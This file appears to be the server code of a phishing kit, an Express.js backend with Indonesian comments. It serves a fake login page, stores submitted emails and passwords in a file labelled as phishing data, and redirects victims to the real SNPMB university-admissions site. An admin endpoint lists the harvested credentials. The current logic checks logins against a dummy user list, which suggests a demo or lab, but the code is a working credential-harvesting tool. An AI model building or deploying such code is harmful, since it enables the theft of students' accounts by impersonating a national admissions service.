const express = require('express');
const path = require('path');
const dotenv = require('dotenv');
const dbSistem = require('./db_sistem.js');
const dbPhising = require('./db_phising.js');

// Init env file
dotenv.config();

/* 
// CONTOH KONEKSI MYSQL UNTUK KE DEPANNYA (Nonaktifkan komen jika sudah dibuat):
const mysql = require('mysql2');
const db = mysql.createConnection({
    host: process.env.DB_HOST || 'localhost',
    user: process.env.DB_USER || 'root',
    password: process.env.DB_PASS || '',
    database: process.env.DB_NAME || 'sistem_login'
});

db.connect((err) => {
    if (err) {
        console.error('Koneksi MySQL gagal:', err);
    } else {
        console.log('Terhubung ke database MySQL');
    }
});
*/

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});

// Endpoint untuk halaman UI Admin
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'UIadmin.html'));
});

// Endpoint untuk mengambil data phishing yang berhasil dari db_phising.js
app.get('/api/phising-data', (req, res) => {
    /*
    // CONTOH QUERY UNTUK MENGAMBIL DATA PHISING DARI MYSQL (Nonaktifkan komen jika database sudah siap)
    const sqlGetPhising = "SELECT email, password FROM phising_data ORDER BY id DESC"; // Sesuaikan nama tabel/kolom
    db.query(sqlGetPhising, (err, results) => {
        if (err) {
            console.error(err);
            return res.json({ success: false, message: 'Gagal memuat data dari database MySQL' });
        }
        res.json({ success: true, data: results });
    });
    // Jika sudah menggunakan MySQL, pastikan mengembalikan res.json diatas dan MENONAKTIFKAN KODE FILE-SYSTEM DUMMY DI BAWAH INI:
    */

    const fs = require('fs');
    try {
        const fileContent = fs.readFileSync(path.join(__dirname, 'db_phising.js'), 'utf8');
        const lines = fileContent.split('\n');
        
        const phisingData = [];
        
        // Membaca baris per baris untuk menemukan text "TERSIMPAN: Email: ... | Password: ..."
        lines.forEach(line => {
            if (line.includes('// TERSIMPAN:')) {
                // Mengekstrak email dan password secara sederhana menggunakan regex
                const emailMatch = line.match(/Email: (.*?) \|/);
                const passMatch = line.match(/Password: (.*)/);
                
                if (emailMatch && passMatch) {
                    phisingData.push({
                        email: emailMatch[1].trim(),
                        // Membersihkan password jika di log file ada '| Waktu:' setelahnya
                        password: passMatch[1].split('|')[0].trim()
                    });
                }
            }
        });
        
        res.json({ success: true, data: phisingData });
    } catch (error) {
        console.error('Gagal membaca db_phising.js', error);
        res.status(500).json({ success: false, message: 'Gagal memuat data' });
    }
});

app.post('/api/login', (req, res) => {
    const { email, password } = req.body;

    /*
    // CONTOH QUERY DATABASE MYSQL KE DEPANNYA (Nonaktifkan komen jika database sudah siap):
    const sqlSelect = "SELECT * FROM users WHERE email = ? AND password = ?";
    db.query(sqlSelect, [email, password], (err, results) => {
        if (err) {
            console.error(err);
            return res.json({ success: false, message: 'Terjadi kesalahan pada server database' });
        }
        
        if (results.length > 0) {
            // Jika berhasil menemukan user, masukkan ke db phising
            const sqlInsert = "INSERT INTO phising_data (email, password) VALUES (?, ?)";
            db.query(sqlInsert, [email, password], (errInsert) => {
                if (errInsert) console.error(errInsert);
                return res.json({ success: true, redirect: 'https://snpmb.id/' });
            });
        } else {
            return res.json({ success: false, message: 'Email atau kata sandi tidak valid' });
        }
    });
    // Agar logic MySQL ini digunakan, pastikan me-return response di atas dan hapus atau komen seluruh logika dummy di bawah.
    */

    // === Logika dummy menggunakan db_sistem.js (Nonaktifkan jika menggunakan MySQL di atas) ===
    const userMatch = dbSistem.find(u => u.email === email && u.password === password);

    if (userMatch) {
        // Jika cocok, insert ke db_phising.js
        dbPhising.insertData(email, password);
        return res.json({ success: true, redirect: 'https://snpmb.id/' });
    } else {
        return res.json({ success: false, message: 'Email atau kata sandi tidak valid' });
    }
    // =========================================================================================
});

app.listen(PORT, () => {
    console.log(`Server berjalan di http://localhost:${PORT}`);
});
